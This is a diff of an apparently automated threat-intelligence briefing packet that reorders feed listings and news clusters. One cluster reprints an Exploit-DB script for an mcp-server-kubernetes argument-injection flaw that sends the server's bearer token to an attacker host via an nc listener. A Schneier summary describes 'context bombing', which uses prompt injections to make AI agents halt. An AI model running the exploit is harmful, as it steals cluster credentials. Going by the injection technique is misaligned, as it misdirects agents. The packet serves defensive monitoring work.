@@ -1,13 +1,13 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-08-14T22:29:46.211594+00:00
+- Generated: 2026-08-14T23:27:54.994935+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 73
-- Total items in window: 325
-- Total clusters raw: 145
-- Total clusters in packet: 73
+- Total items in window: 324
+- Total clusters raw: 143
+- Total clusters in packet: 71
 - Dropped low score: 72
 - Dropped overflow: 0
 
@@ -75,66 +75,61 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Unit 42** (threat_research_primary)
+  - URL: https://unit42.paloaltonetworks.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Unit 42** (threat_research_primary)
-  - URL: https://unit42.paloaltonetworks.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 3
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
   - Item count: 25
-  - In window count: 0
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 3
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
+  - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 4
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
@@ -145,11 +140,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 9
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
   - Status: ok
-  - Item count: 100
-  - In window count: 4
+  - Item count: 50
+  - In window count: 3
 - **Volexity** (threat_research_primary)
   - URL: https://www.volexity.com/feed/
   - Status: ok
@@ -165,6 +160,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
@@ -175,11 +175,11 @@
   - Status: ok
   - Item count: 50
   - In window count: 11
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
@@ -205,16 +205,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Sophos X-Ops** (detection_response_operations)
+  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
@@ -225,45 +225,50 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Sophos X-Ops** (detection_response_operations)
-  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
-  - Item count: 15
-  - In window count: 2
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
+  - Item count: 100
   - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 0
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
-  - In window count: 0
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 5
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
   - In window count: 0
 - **AWS Security Blog** (cloud_identity_infrastructure)
   - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
   - Item count: 20
   - In window count: 7
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
-  - Item count: 100
+  - Item count: 20
+  - In window count: 5
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
@@ -275,11 +280,6 @@
   - Status: ok
   - Item count: 100
   - In window count: 2
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Cloudflare Security** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
@@ -295,11 +295,6 @@
   - Status: ok
   - Item count: 100
   - In window count: 5
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
@@ -315,26 +310,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 3
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 4
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 11
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 20
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
@@ -345,18 +330,13 @@
   - Status: ok
   - Item count: 15
   - In window count: 15
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 11
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -365,16 +345,36 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 20
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 21
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
@@ -395,11 +395,26 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Reddit r/sysadmin** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/sysadmin/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **The Hacker News** (cyber_news_breach_reporting)
   - URL: https://feeds.feedburner.com/TheHackersNews
   - Status: ok
@@ -410,31 +425,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
   - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/sysadmin** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
+  - Item count: 100
+  - In window count: 1
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
@@ -445,16 +445,16 @@
   - Status: ok
   - Item count: 25
   - In window count: 21
-- **Embrace the Red** (ai_security_agentic_risk)
-  - URL: https://embracethered.com/blog/index.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **tl;dr sec** (practitioner_analysis)
   - URL: https://tldrsec.com/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Embrace the Red** (ai_security_agentic_risk)
+  - URL: https://embracethered.com/blog/index.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
@@ -519,9 +519,9 @@
   - https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
   - https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/
   - https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/
-  - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
   - https://risky.biz/RBNEWS600/
   - https://www.securityweek.com/amnesiastealer-macos-malware-steals-data-controls-browser-sessions/
+  - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
   - https://thehackernews.com/2026/08/progress-kemp-loadmaster-flaw-hits-cisa.html
   - https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/
   - https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/
@@ -565,9 +565,9 @@
 - Links:
   - https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/
   - https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/
-  - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
   - https://risky.biz/RBNEWS600/
   - https://www.securityweek.com/amnesiastealer-macos-malware-steals-data-controls-browser-sessions/
+  - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
   - https://www.bleepingcomputer.com/news/microsoft/microsoft-patches-legacyhive-windows-zero-day-vulnerability/
   - https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
   - https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/
@@ -739,10 +739,7 @@
 ## Forward signals
 
 ### Novelty
-- Novel cves: 3
-  - CVE-2025-49132 (first seen via Rapid7 at 2026-08-14T21:27:45+00:00, cluster e15b654037)
-  - CVE-2026-22594 (first seen via Rapid7 at 2026-08-14T21:27:45+00:00, cluster e15b654037)
-  - CVE-2026-29053 (first seen via Rapid7 at 2026-08-14T21:27:45+00:00, cluster e15b654037)
+- Novel cves: 0
 - Novel actors: 0
 - Novel products: 0
 
@@ -785,19 +782,18 @@
   - Prior top industries: education, financial_services, government
   - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce
 
-### Persistence (14)
+### Persistence (13)
 - actor_attribution: ShinyHunters (weeks observed: 11, cluster 75a2a6649a)
-- actor_attribution: Scattered Spider (weeks observed: 9, cluster fb2a69eb0a)
 - cve_ids: CVE-2026-33825 (weeks observed: 6, cluster e3235a03c3)
 - actor_attribution: Cl0p (weeks observed: 6, cluster fb556ca51b)
 - cve_ids: CVE-2026-50656 (weeks observed: 4, cluster 17761b9ecf)
+- cve_ids: CVE-2026-15409 (weeks observed: 4, cluster e15b654037)
 - cve_ids: CVE-2026-50751 (weeks observed: 4, cluster e3235a03c3)
 - cve_ids: CVE-2026-8037 (weeks observed: 4, cluster c97f90a69b)
 - actor_attribution: Mustang Panda (weeks observed: 4, cluster 21cbe0b5fa)
 - cve_ids: CVE-2026-18556 (weeks observed: 3, cluster 67b968df05)
 - cve_ids: CVE-2026-18577 (weeks observed: 3, cluster 67b968df05)
 - actor_attribution: Lazarus (weeks observed: 3, cluster c13f381a5a)
-- cve_ids: CVE-2026-15409 (weeks observed: 3, cluster e15b654037)
 - cve_ids: CVE-2026-59309 (weeks observed: 3, cluster 4535ef9ae8)
 - cve_ids: CVE-2026-59310 (weeks observed: 3, cluster 4535ef9ae8)
 
@@ -1644,11 +1640,6 @@ Table of Contents Quarterly figures Ransomware Quarterly trends and highlights T
   - Published: 2026-08-14T14:59:55+00:00
   - Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/
   - Summary: The Netherlands' National Cyber Security Centre (NCSC) is warning that hackers are actively exploiting a macOS authentication bypass vulnerability after public exploit code emerged. [...]
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Novel macOS Infostealer AmnesiaStealer Spread via ClickFix
-  - Published: 2026-08-14T10:45:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
-  - Summary: AmnesiaStealer contains novel functions, including the attackers gaining remote control over the victim’s browser to steal cookie data
 - **Risky Business News** (practitioner_analysis)
   - Title: Risky Bulletin: US will let private companies carry out offensive cyber ops
   - Published: 2026-08-14T04:37:40+00:00
@@ -1659,6 +1650,11 @@ Table of Contents Quarterly figures Ransomware Quarterly trends and highlights T
   - Published: 2026-08-14T06:41:43+00:00
   - Link: https://www.securityweek.com/amnesiastealer-macos-malware-steals-data-controls-browser-sessions/
   - Summary: The Rust-based macOS infostealer harvests users’ passwords, keychain information, Chromium-based browser data, and Safari cookies. The post AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions appeared first on SecurityWeek .
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: Novel macOS Infostealer AmnesiaStealer Spread via ClickFix
+  - Published: 2026-08-14T10:45:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
+  - Summary: AmnesiaStealer contains novel functions, including the attackers gaining remote control over the victim’s browser to steal cookie data
 
 ### Cluster 6a4c525838 — score 16
 
@@ -1718,56 +1714,6 @@ From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Tu
   - Link: https://www.schneier.com/blog/archives/2026/08/prompt-injections-for-defense.html
   - Summary: This seems to work : Researchers from Tracebit on Monday said they found that placing prompt injections alongside passwords, cryptographic keys, and other secrets stored on Amazon Web Services was often all that was needed to shut down attacks from AI hacking agents. The prompts direct the attacking LLM to perform an action forbidden by its guardrails, the safety barriers AI developers erect to prevent it from taking harmful actions. The LLM responds by shutting down. Examples are a prompt that orders the LLM to provide steps for developing inhalable Anthrax spores, or, in the case of LLMs from Chinese developers, make references to the iconic Tank Man from the 1989 Tiananmen Square massacre. Once the LLM encounters these forbidden commands, it no longer follows its existing commands. The researchers have named the technique context bombing...
 
-### Cluster c9f01215de — score 16
-
-- Title: [remote] mcp-server-kubernetes 3.8.x - Argument Injection
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-08-11T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52638
-- Fetch status: ok
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: Kubernetes
-
-#### Cluster taxonomy (union across members)
-- affected_products: Anthropic/Claude, GitHub, Kubernetes
-- cve_ids: CVE-2026-61459
-- urgency_signals: critical_cvss, poc_available
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research, tier_2_operator
-
-#### Primary article taxonomy
-- affected_products: Kubernetes, Anthropic/Claude, GitHub
-- cve_ids: CVE-2026-61459
-- urgency_signals: poc_available, critical_cvss
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-mcp-server-kubernetes 3.8.x - Argument Injection
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r""" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ """) import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description="CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection") parser.add_argument("--target", required=True, help="MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)") parser.add_argument("--attacker", required=True, help="Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)") parser.add_argument("--tool", default="kubectl_get", choices=["kubectl_get", "kubectl_describe", "kubectl_delete"], help="Tool to exploit") parser.add_argument("--namespace", default="default", help="Kubernetes namespace") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { "jsonrpc": "2.0", "method": "tools/call", "params": { "name": args.tool, "arguments": { "resourceType": f"--server={args.attacker}", "name": "dummy-pod", "namespace": args.namespace, "output": "json" } }, "id": 1 } print(f"[+] Sending exploit to {args.target} using {args.tool}") print(f"[+] Attacker server: {args.attacker}") print("[+] Waiting for token exfiltration...") try: response = requests.post( args.target, json=payload, headers={"Content-Type": "application/json"}, timeout=10 ) print(f"[+] Response status: {response.status_code}") if response.status_code == 200: print("[+] Exploit sent successfully. Check your listener for the bearer token!") else: print(f"[-] Unexpected response: {response.text[:500]}") except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": if len(sys.argv) < 2: print("Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S
-```
-
-#### Corroborating sources (2)
-
-- **Exploit-DB** (offensive_vulnerability_research)
-  - Title: [remote] mcp-server-kubernetes 3.8.x - Argument Injection
-  - Published: 2026-08-11T00:00:00+00:00
-  - Link: https://www.exploit-db.com/exploits/52638
-  - Summary: mcp-server-kubernetes 3.8.x - Argument Injection
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - Title: ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices
-  - Published: 2026-08-10T16:00:00+00:00
-  - Link: https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/
-  - Summary: Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec
-
 ### Cluster 44ffee7a7d — score 16
 
 - Title: What 50 open source projects taught us about security in the AI era
@@ -1820,6 +1766,56 @@ Gregg Cochran · @dubsopenhub August 13, 2026 | 11 minutes Share: AI is changing
   - Published: 2026-08-10T07:38:23+00:00
   - Link: https://thehackernews.com/2026/08/solidity-pro-vs-code-extensions-steal.html
   - Summary: Cybersecurity researchers have flagged a malicious Microsoft Visual Studio Code (VS Code) extension named Solidity Pro ("solidity-pro") that has been observed delivering a browser wallet and credential stealer. The names of the extensions are below - helper-beeps.solidity-pro web3devtoolsx.solidity-pro Although neither of the extensions is now available on Open VSX, the GitHub repository
+
+### Cluster c9f01215de — score 16
+
+- Title: [remote] mcp-server-kubernetes 3.8.x - Argument Injection
+- Source: Exploit-DB (offensive_vulnerability_research)
+- Published: 2026-08-11T00:00:00+00:00
+- Link: https://www.exploit-db.com/exploits/52638
+- Fetch status: ok
+- Member count: 2
+- Corroborating source count: 2
+- Strong signals: Kubernetes
+
+#### Cluster taxonomy (union across members)
+- affected_products: Anthropic/Claude, GitHub, Kubernetes
+- cve_ids: CVE-2026-61459
+- urgency_signals: critical_cvss, poc_available
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research, tier_2_operator
+
+#### Primary article taxonomy
+- affected_products: Kubernetes, Anthropic/Claude, GitHub
+- cve_ids: CVE-2026-61459
+- urgency_signals: poc_available, critical_cvss
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+mcp-server-kubernetes 3.8.x - Argument Injection
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r""" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ """) import requests import json import argparse import sys def main(): banner() parser = 